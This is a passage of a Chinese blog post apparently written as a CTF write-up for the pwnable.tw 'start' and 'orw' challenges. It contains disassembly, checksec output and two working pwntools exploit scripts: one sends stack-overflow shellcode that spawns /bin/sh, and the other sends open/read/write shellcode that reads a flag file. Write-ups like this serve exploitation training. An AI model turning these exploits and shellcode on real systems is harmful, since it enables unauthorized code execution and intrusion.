+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08048087 01C mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089 01C mov     dl, 14h</span><br><span class="line">.text:0804808B 01C mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D 01C mov     al, 4</span><br><span class="line">.text:0804808F 01C int     80h             ; LINUX - sys_write</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048091 01C xor     ebx, ebx</span><br><span class="line">.text:08048093 01C mov     dl, 3Ch</span><br><span class="line">.text:08048095 01C mov     al, 3</span><br><span class="line">.text:08048097 01C int     80h             ; LINUX -</span><br></pre></td></tr></table></figure>
+
+<p>可以发现它让我们写 0x3C 个字符,完全可以覆盖返回地址,本题有两个系统调用,一个是<code>sys_read(ax=3)</code>,另一个为<code>sys_write(ax=4)</code>,因为本题的<strong>NX</strong>是关的,我们直接在栈上写<strong>shellcode</strong>即可</p>
+<p>要做的只有:</p>
+<ul>
+<li>知道<strong>esp</strong>的值</li>
+<li>写<strong>shellcode</strong></li>
+</ul>
+<p>直接交exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&#x27;./start&#x27;)</span><br><span class="line">pay=&#x27;a&#x27;*20+p32(0x08048087)</span><br><span class="line">p.sendafter(&#x27;CTF:&#x27;,pay)</span><br><span class="line">esp=u32(p.recv(4))</span><br><span class="line">print hex(esp)</span><br><span class="line">pay=&#x27;a&#x27;*20+p32(esp+0x14)+&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>同时我们要注意,第一个不能sendline,这样会破坏esp的值,其次在第二个传输的时候不要死脑筋,想着一定要布置到给定的20个字节中,直接让<code>esp+20</code>之后在从容的布置更加优雅</p>
+<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 ./orw </span><br><span class="line">Give my your shellcode:12</span><br><span class="line">[1]    9368 segmentation fault (core dumped)  ./orw</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 checksec orw</span><br><span class="line">[*] &#x27;/home/pic/\xe4\xb8\x8b\xe8\xbd\xbd/orw&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552 push    ebp</span><br><span class="line">.text:08048553 mov     ebp, esp</span><br><span class="line">.text:08048555 push    ecx</span><br><span class="line">.text:08048556 sub     esp, 4</span><br><span class="line">.text:08048559 call    orw_seccomp</span><br><span class="line">.text:0804855E sub     esp, 0Ch</span><br><span class="line">.text:08048561 push    offset aGiveMyYourShel ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566 call    _printf</span><br><span class="line">.text:0804856B add     esp, 10h</span><br><span class="line">.text:0804856E sub     esp, 4</span><br><span class="line">.text:08048571 push    0C8h</span><br><span class="line">.text:08048576 push    offset shellcode</span><br><span class="line">.text:0804857B push    0</span><br><span class="line">.text:0804857D call    _read</span><br><span class="line">.text:08048582 add     esp, 10h</span><br><span class="line">.text:08048585 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A call    eax ; shellcode</span><br><span class="line">.text:0804858C mov     eax, 0</span><br><span class="line">.text:08048591 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594 leave</span><br><span class="line">.text:08048595 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598 retn</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在输出字符串之前有个<code>orw_seccomp</code>函数,此函数用来限制系统调用,我们只能调用4个函数,不过够了,其中有<code>open</code>,<code>write</code>和<code>read</code>,完全可以搞定,继续看汇编代码,<br>打印出<code>Give my your shellcode:</code>后,让我们在<code>0C8h</code>个字节里写入数据,之后直接调用这个<code>shellcode</code>,行,我们的思路如下:</p>
+<ul>
+<li>知道<strong>flag</strong>的位置</li>
+<li>使用<code>open</code>打开flag文件</li>
+<li>用<code>write</code>读出文件</li>
+<li><code>read</code>打印出来</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;, 10001)</span><br><span class="line">shellcode = &quot;&quot;</span><br><span class="line">shellcode += shellcraft.i386.pushstr(&quot;/home/orw/flag&quot;)    </span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#x27;esp&#x27;)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#x27;eax&#x27;, &#x27;esp&#x27;, 0x30)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#x27;esp&#x27;, 0x30)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/06/25/2019-06-25-kr_1st/" data-id="cuid0rA8fwheV5E0GTdw6VkA6" data-title="pwnable.kr" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/08/08/2019-08-08-some_note/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          一些笔记
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/06/24/2019-06-24-third/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">大二参加国赛</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
